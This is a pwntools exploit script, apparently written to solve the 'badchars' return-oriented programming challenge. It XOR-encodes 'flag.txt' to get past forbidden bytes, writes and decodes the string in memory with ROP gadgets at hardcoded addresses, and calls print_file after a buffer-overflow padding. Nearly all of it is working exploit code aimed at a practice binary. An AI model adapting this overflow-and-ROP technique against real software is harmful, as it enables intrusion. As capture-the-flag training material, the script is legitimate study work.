from pwn import *

def encode_badchars(data, badchars, key):
    result = b""
    encoded_byte_offsets = []
    for i, b in enumerate(data):
        if b in badchars:
            result += bytes([b ^ ord(key)])
            encoded_byte_offsets.append(i)
            continue
        result += bytes([b])
    return result, encoded_byte_offsets

# Alphabets
plaintext_target = b"flag.txt"
badchars = b"xga.\n\r"
key = b"\x90"
target, encoded_byte_offsets = encode_badchars(plaintext_target, badchars, key)

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'info'

# Project constants
PROCESS = './badchars'
io = process(PROCESS)

# Debugging
gdbscript = "b *0x00601028\nb *0x0040069c"  #breakpoints at .data region and pop gadget
#gdbscript = ""
#pid = gdb.attach(io, gdbscript=gdbscript)

# Initialize ROP
rop = ROP(io.elf)

# Gadgets
writable_data_segment = p64(0x00601029)                         # .data starts at 1028 but fails with flag.t\xe8t,not enough storage maybe
xor_r15_r14_ret = p64(0x0000000000400628)                       # xor byte [r15], r14b; ret;
write_memory_gadget = p64(0x0000000000400634)                   # mov qword [r13], r12; ret;
pop_r12_pop_r13_pop_r14_pop_r15_ret = p64(0x000000000040069c)   # pop r12; pop r13; pop r14; pop r15; ret;
pop_r14_pop_r15_ret = p64(0x00000000004006a0)                   # pop r14; pop r15; ret;
pop_rdi_ret = p64(0x00000000004006a3)                           # pop rdi; ret;

# Existing functions
print_file = p64(io.elf.plt['print_file'])

info(f'XOR Key: {key}')
info(f'Encoded target: {target}')

# Write the encoded target to the .data section

rop.raw(pop_r12_pop_r13_pop_r14_pop_r15_ret)    #poping registers
rop.raw(target)                                 #encoded target value put in r12
rop.raw(writable_data_segment)                  #writable .data segment put in r13
rop.raw(p64(0xdeadbeefdeadbeef))                # junk for r14 cuz they got popped too
rop.raw(p64(0xdeadbeefdeadbeef))                # junk for r15 cuz they got popped too
rop.raw(write_memory_gadget)                    #write value to r13

#Decode the encoded target in .data segment
for encoded_byte_offset in encoded_byte_offsets:    #looping over offset values that show locations of encoded values
    write_location = p64(u64(writable_data_segment) + encoded_byte_offset)
                                                    #selecting the value with respect to the segment + offset of the character
    rop.raw(pop_r14_pop_r15_ret)                    #poping registers to hold values, and xor to decode
    rop.raw(p64(ord(key)))                          #putting the value of our key(\x90) in r14
    rop.raw(write_location)                         #putting the value of character(calculated with offset) in r15
    rop.raw(xor_r15_r14_ret)                        #using the xor gadget to "decode" the original value

rop.raw(pop_rdi_ret)                            #pop rdi, to get the flag.txt value
rop.raw(writable_data_segment)                  #location which has the address of our decoded value
rop.raw(print_file)                             #print_file function to print our flag

# Make the payload
padding = b"A" * 40
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
